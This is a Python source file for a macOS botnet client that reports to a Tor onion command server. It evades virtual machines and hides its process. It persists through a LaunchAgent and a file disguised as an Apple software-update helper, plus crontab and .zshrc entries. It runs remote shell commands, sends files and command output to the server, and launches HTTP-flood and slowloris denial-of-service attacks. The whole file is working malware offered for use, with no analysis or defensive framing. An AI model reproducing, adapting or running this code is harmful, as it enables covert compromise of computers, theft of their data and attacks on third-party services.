#! /usr/bin/env python3
import requests
import threading
import time
import random
import platform
import socket
import uuid
import subprocess
import os
import sys
import base64
import hashlib
import shutil
import plistlib
import getpass

C2_ONION = "CHANGE_TO_YOUR_ONION_ADDRESS"
SHARED_SECRET = "CHANGE_TO_C2_SECRET"
C2_URL = f"http://{C2_ONION}"
BOT_ID = hashlib.md5((socket.gethostname() + str(uuid.getnode()).encode()).hex().encode()).hexdigest()[:12]
ATTACK_STOP = threading.Event()
PROXIES = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}

def token():
    return hashlib.sha256(f"{BOT_ID}:{SHARED_SECRET}".encode()).hexdigest()[:16]

def anti_vm():
    flags = 0
    try:
        r = subprocess.run(['sysctl', '-n', 'machdep.cpu.features'], capture_output=True, text=True)
        if 'VMM' in r.stdout.upper(): flags += 1
    except: pass
    try:
        r = subprocess.run(['system_profiler', 'SPHardwareDataType'], capture_output=True, text=True)
        if any(x in r.stdout.lower() for x in ['vmware','virtualbox','parallels']): flags += 1
    except: pass
    if flags >= 1: sys.exit(0)

def hide_process():
    try:
        subprocess.run(['renice', '-20', str(os.getpid())], capture_output=True)
        subprocess.run(['osascript', '-e', 'tell app "Terminal" to set visible of front window to false'], capture_output=True)
    except: pass

def setup_tor():
    try:
        s = socket.socket()
        s.settimeout(1)
        if s.connect_ex(('127.0.0.1', 9050)) != 0:
            subprocess.Popen(['tor', '--SocksPort', '9050', '--DataDirectory', '/tmp/.cache-tor',
                              '--HiddenServiceStatistics', '0', '--Log', 'notice', 'stderr'],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(5)
        s.close()
    except: pass

def persistence():
    script_path = os.path.abspath(sys.argv[0])
    install_path = '/Library/Application Support/com.apple.softwareupdate.helper'
    if script_path != install_path:
        try:
            shutil.copy2(script_path, install_path)
            os.chmod(install_path, 0o755)
            ref = '/usr/libexec/softwareupdate' if os.path.exists('/usr/libexec/softwareupdate') else '/usr/sbin/bluetoothaudiod'
            if os.path.exists(ref):
                stat_ref = os.stat(ref)
                os.utime(install_path, (stat_ref.st_atime, stat_ref.st_mtime))
            script_path = install_path
        except: pass
    # LaunchAgent for user persistence
    agent_path = os.path.expanduser('~/Library/LaunchAgents/com.apple.softwareupdate.helper.plist')
    os.makedirs(os.path.dirname(agent_path), exist_ok=True)
    plist = {
        'Label': 'com.apple.softwareupdate.helper',
        'ProgramArguments': [script_path],
        'RunAtLoad': True,
        'KeepAlive': {'NetworkState': True},
        'StartInterval': 300,
        'ThrottleInterval': 60
    }
    with open(agent_path, 'wb') as f:
        plistlib.dump(plist, f)
    subprocess.run(['launchctl', 'load', '-w', agent_path], capture_output=True)
    # Crontab backup
    rand_delay = random.randint(0, 120)
    cron_line = f"@reboot sleep {rand_delay} && {script_path} >/dev/null 2>&1 &\n"
    subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -', shell=True, capture_output=True)
    # Zsh profile fallback
    zshrc = os.path.expanduser('~/.zshrc')
    with open(zshrc, 'a') as f:
        f.write(f'\n(sleep $((RANDOM % 300)) && {script_path} &) >/dev/null 2>&1\n')

def register():
    try:
        r = requests.post(f"{C2_URL}/register", json={
            'bot_id': BOT_ID, 'os': 'macOS', 'hostname': socket.gethostname(),
            'cpu': os.cpu_count() or 1, 'username': getpass.getuser(),
            'token': token()
        }, proxies=PROXIES, timeout=10)
    except: pass

def poll():
    try:
        r = requests.post(f"{C2_URL}/poll", json={'bot_id': BOT_ID, 'token': token()}, proxies=PROXIES, timeout=15)
        if r.status_code != 200: return None
        return r.json()
    except: return None

def send_result(output):
    try:
        encoded = base64.b64encode(output.encode() if isinstance(output, str) else output).decode()
        requests.post(f"{C2_URL}/result", json={'bot_id': BOT_ID, 'result': encoded, 'token': token()}, proxies=PROXIES, timeout=10)
    except: pass

def send_file(filename, content):
    try:
        encoded = base64.b64encode(content).decode()
        requests.post(f"{C2_URL}/download", json={'bot_id': BOT_ID, 'filename': filename, 'content': encoded, 'token': token()}, proxies=PROXIES, timeout=30)
    except: pass

def attack_http(target, duration):
    stop_at = time.time() + duration
    while time.time() < stop_at and not ATTACK_STOP.is_set():
        try:
            requests.get(target, headers={'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'}, timeout=5)
        except: pass
        time.sleep(0.01)

def attack_slowloris(target, duration):
    stop_at = time.time() + duration
    sockets = []
    while time.time() < stop_at and not ATTACK_STOP.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            host = target.replace('http://','').replace('https://','').split('/')[0]
            s.connect((host, 80))
            s.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n")
            sockets.append(s)
        except: pass
        time.sleep(15)
        for s in sockets[:]:
            try: s.sendall(b"X-a: " + os.urandom(8).hex().encode() + b"\r\n")
            except: sockets.remove(s)
    for s in sockets: s.close()

def uninstall():
    agent_path = os.path.expanduser('~/Library/LaunchAgents/com.apple.softwareupdate.helper.plist')
    install_path = '/Library/Application Support/com.apple.softwareupdate.helper'
    subprocess.run(['launchctl', 'unload', '-w', agent_path], capture_output=True)
    for p in [agent_path, install_path]:
        try:
            with open(p, 'wb') as f: f.write(os.urandom(1024))
            os.remove(p)
        except: pass
    subprocess.run("crontab -l 2>/dev/null | grep -v softwareupdate | crontab -", shell=True, capture_output=True)
    sys.exit(0)

def main():
    anti_vm()
    setup_tor()
    time.sleep(random.uniform(2,10))
    hide_process()
    persistence()
    register()
    while True:
        try:
            resp = poll()
            if resp:
                cmd = resp.get('command', 'idle')
                if cmd == 'shell':
                    data = resp.get('data', '')
                    if data.lower().startswith('download'):
                        path = data.split(' ', 1)[1] if ' ' in data else ''
                        if os.path.exists(path):
                            with open(path, 'rb') as f:
                                send_file(os.path.basename(path), f.read())
                    elif data.lower().strip() == 'uninstall':
                        uninstall()
                    else:
                        result = subprocess.getoutput(data)
                        send_result(result)
                elif cmd == 'download':
                    path = resp.get('path', '')
                    if os.path.exists(path):
                        with open(path, 'rb') as f:
                            send_file(os.path.basename(path), f.read())
                elif cmd == 'attack':
                    ATTACK_STOP.clear()
                    target = resp['target']; duration = resp['duration']; method = resp['method']
                    if method == 'http': attack_http(target, duration)
                    elif method == 'slowloris': attack_slowloris(target, duration)
            time.sleep(random.uniform(45, 300))
        except:
            time.sleep(random.uniform(45, 300))

if __name__ == '__main__':
    main()